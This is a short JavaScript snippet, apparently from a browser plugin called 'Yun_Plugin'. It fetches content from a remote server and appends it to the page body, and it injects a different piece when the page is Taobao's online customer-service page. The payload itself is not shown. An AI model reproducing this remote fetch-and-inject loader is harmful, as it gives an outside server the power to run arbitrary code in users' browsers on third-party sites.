
console.log("Welcome,Power by Yun_Plugin");
$.ajax({
    type: "post", 
    url: "https://www.plug-in.top/New/PHP/yun_load.php",
    success: function (result) {
        var l=result.split(";");
        $("body").append(l[0]);
        setTimeout(() => {
            if(window.location.href.indexOf("https://ospservice.taobao.com/support/onlinecs")>-1)
            {
                $("body").append(l[2]);
            }
            else
            {
                $("body").append(l[1]);
            }
        }, 2000);
    } 
});